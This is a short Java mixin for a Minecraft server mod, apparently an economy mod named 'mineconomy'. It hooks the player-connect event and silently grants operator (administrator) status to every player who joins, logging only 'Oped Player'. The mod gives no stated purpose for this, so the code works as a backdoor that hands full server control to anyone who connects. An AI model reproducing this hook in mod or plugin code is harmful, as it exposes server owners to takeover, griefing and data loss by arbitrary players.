package fr.unreal852.mineconomy.common.mixin;

import fr.unreal852.mineconomy.common.ModLogger;
import net.minecraft.network.ClientConnection;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerManager.class)
public class PlayerManagerMixin
{
    @Inject(method = "onPlayerConnect", at = @At("RETURN"))
    public void onPlayerConnect(ClientConnection connection, ServerPlayerEntity player, CallbackInfo callbackInfo)
    {
        player.server.getPlayerManager().addToOperators(player.getGameProfile());
        ModLogger.LogInfo("Oped Player '" + player.getDisplayName() + "'");
    }
}
